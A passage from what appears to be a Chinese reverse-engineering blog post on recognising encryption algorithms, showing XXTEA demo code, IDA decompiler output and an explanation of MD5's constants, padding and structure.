class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 2 个 4 字节为一组</span>        <span class="token function">xxtea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：0x%x 0x%x 0x%x 0x%x\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment">// 2 个 4 字节为一组</span>        <span class="token function">xxtea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：0x%x 0x%x 0x%x 0x%x\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后：0xf1560f7a 0x17cf17fa 0xf69c6e0c 0x3d09333e解密后：0xdeadbeef 0xfaceb00c 0xdac0ffee 0xabadbabe*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">uint32_t</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span> <span class="token number">0xFACEB00C</span><span class="token punctuation">,</span> <span class="token number">0xDAC0FFEE</span><span class="token punctuation">,</span> <span class="token number">0xABADBABE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数  </span>  <span class="token comment">// 加密  </span><span class="token function">xxtea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：0x%x 0x%x 0x%x 0x%x\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 解密  </span><span class="token function">xxtea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：0x%x 0x%x 0x%x 0x%x\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">/* 输出：  加密后：0xf1560f7a 0x17cf17fa 0xdac0ffee 0xabadbabe  加密后：(乱码)解密后：0xdeadbeef 0xfaceb00c 0xdac0ffee 0xabadbabe  解密后：(乱码)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例二</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"password123456789"</span><span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> data_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// data 的长度</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment">// 8 字节为一组</span>        <span class="token function">xxtea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment">// 8 字节为一组</span>        <span class="token function">xxtea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后：(乱码)解密后：password123456789*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span>    </span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"password123456789"</span><span class="token punctuation">;</span>        <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>          <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数    </span>          <span class="token function">xxtea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token function">xxtea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* 输出：  加密后：(乱码)123456789  解密后：password123456789  */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="IDA-示例-4"><a href="#IDA-示例-4" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">xxtea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> _DWORD <span class="token operator">*</span>a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>  _DWORD <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-14h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-Ch]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp-4h]</span>  v9 <span class="token operator">=</span> <span class="token number">0x34</span> <span class="token operator">/</span> a1 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> a2<span class="token punctuation">[</span>a1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v7 <span class="token operator">-=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v11 <span class="token operator">=</span> a2<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">*</span>v3 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">^</span> v7<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v6 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v10 <span class="token operator">^</span> i <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> v11<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                          <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v11 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v4 <span class="token operator">=</span> <span class="token operator">&amp;</span>a2<span class="token punctuation">[</span>a1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v4 <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>a2 <span class="token operator">^</span> v7<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>v6 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">4LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v10 <span class="token operator">^</span> i <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                                                        <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span>a2 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>v4<span class="token punctuation">;</span>    v6 <span class="token operator">=</span> result<span class="token punctuation">;</span>    <span class="token operator">--</span>v9<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><blockquote><p>MD5（Message Digest Algorithm）又叫消息摘要算法，是单向散列算法（哈希算法）的一种，其对输入的任意长度的消息进行运算，产生一个 128 位的消息摘要（该过程通常不可逆）</p><p>将产生的 128 位消息摘要用十六进制表示，便是常见的 32 字符的 MD5 码</p><p>而所谓的 16 字符的 MD5 码，其实是这 32 字符中间的 16 个字符</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%817.png" alt="加密算法的函数特征7.png"></p></blockquote><h2 id="特点-5"><a href="#特点-5" class="headerlink" title="特点"></a>特点</h2><ol><li>MD5 通常会出现四个初始化常量：</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">0x67452301</span>   <span class="token comment">// 1732584193</span><span class="token number">0xEFCDAB89</span>   <span class="token comment">// -271733879</span><span class="token number">0x98BADCFE</span>   <span class="token comment">// -1732584194</span><span class="token number">0x10325476</span>   <span class="token comment">// 271733878</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在内存中小端序存放为：<code>01 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10</code></p><ol start="2"><li>通过 IDA 插件 <code>Findcrypt</code> 可以识别出 MD5</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%816.png" alt="加密算法的函数特征6.png"></p><ol start="3"><li>MD5 的实现通常包含三个阶段：<code>MD5_Init</code>、<code>MD5_Update</code>、<code>MD5_Final</code></li></ol><blockquote><p>可能的魔改方式有：</p><ul><li>改变初始化所用到的 4 个常数</li><li>改变填充的方法</li><li>改变哈希变换的处理过程</li></ul></blockquote><hr><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><blockquote><p>这里只提一些关键特征，详细原理见如下参考文献：</p><ol><li><a href="https://blog.csdn.net/m1j2t3/article/details/6050587?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-6050587-blog-26388669.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-2-6050587-blog-26388669.235%5Ev43%5Epc_blog_bottom_relevance_base3&utm_relevant_index=3">MD5算法详解_md5 0x3f-CSDN博客</a>  </li><li><a href="https://bbs.kanxue.com/thread-255756.htm#msg_header_h2_0">[原创]了解常用加解密算法并简单逆向识别-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a>  </li><li><a href="https://www.52pojie.cn/thread-1217147-1-1.html">学破解第115天，《C++之MD5消息摘要算法》学习 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ol></blockquote><ol><li>为了后面填充 64 位的长度，需要先填充消息使其长度与 <code>448 mod 512</code> 同余</li></ol><p>填充方法：附一个 1 在消息后面，然后用 0 填充，填充长度在 0 ~ 512 之间</p><ol start="2"><li>最开始需要使用下面的数组进行初始化：</li></ol><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">&#123;</span> <span class="token number">0x67452301</span><span class="token punctuation">,</span> <span class="token number">0xefcdab89</span><span class="token punctuation">,</span> <span class="token number">0x98badcfe</span><span class="token punctuation">,</span> <span class="token number">0x10325476</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>然后进行数据处理</li></ol><p>需要使用左移数组，对应每轮处理的 <code>4 * 16 ＝ 64</code> 步：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">&#123;</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还需要用到 64 个存放 32 位字节的加法常数数组，对应每组处理的 <code>4 * 16 ＝ 64</code> 步：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">&#123;</span> <span class="token number">0xd76aa478</span><span class="token punctuation">,</span> <span class="token number">0xe8c7b756</span><span class="token punctuation">,</span> <span class="token number">0x242070db</span><span class="token punctuation">,</span> <span class="token number">0xc1bdceee</span><span class="token punctuation">,</span> <span class="token number">0xf57c0faf</span><span class="token punctuation">,</span> <span class="token number">0x4787c62a</span><span class="token punctuation">,</span> <span class="token number">0xa8304613</span><span class="token punctuation">,</span> <span class="token number">0xfd469501</span><span class="token punctuation">,</span> <span class="token number">0x698098d8</span><span class="token punctuation">,</span> <span class="token number">0x8b44f7af</span><span class="token punctuation">,</span> <span class="token number">0xffff5bb1</span><span class="token punctuation">,</span> <span class="token number">0x895cd7be</span><span class="token punctuation">,</span> <span class="token number">0x6b901122</span><span class="token punctuation">,</span> <span class="token number">0xfd987193</span><span class="token punctuation">,</span> <span class="token number">0xa679438e</span><span class="token punctuation">,</span> <span class="token number">0x49b40821</span><span class="token punctuation">,</span> <span class="token number">0xf61e2562</span><span class="token punctuation">,</span> <span class="token number">0xc040b340</span><span class="token punctuation">,</span> <span class="token number">0x265e5a51</span><span class="token punctuation">,</span> <span class="token number">0xe9b6c7aa</span><span class="token punctuation">,</span> <span class="token number">0xd62f105d</span><span class="token punctuation">,</span> <span class="token number">0x02441453</span><span class="token punctuation">,</span> <span class="token number">0xd8a1e681</span><span class="token punctuation">,</span> <span class="token number">0xe7d3fbc8</span><span class="token punctuation">,</span> <span class="token number">0x21e1cde6</span><span class="token punctuation">,</span> <span class="token number">0xc33707d6</span><span class="token punctuation">,</span> <span class="token number">0xf4d50d87</span><span class="token punctuation">,</span> <span class="token number">0x455a14ed</span><span class="token punctuation">,</span> <span class="token number">0xa9e3e905</span><span class="token punctuation">,</span> <span class="token number">0xfcefa3f8</span><span class="token punctuation">,</span> <span class="token number">0x676f02d9</span><span class="token punctuation">,</span> <span class="token number">0x8d2a4c8a</span><span class="token punctuation">,</span> <span class="token 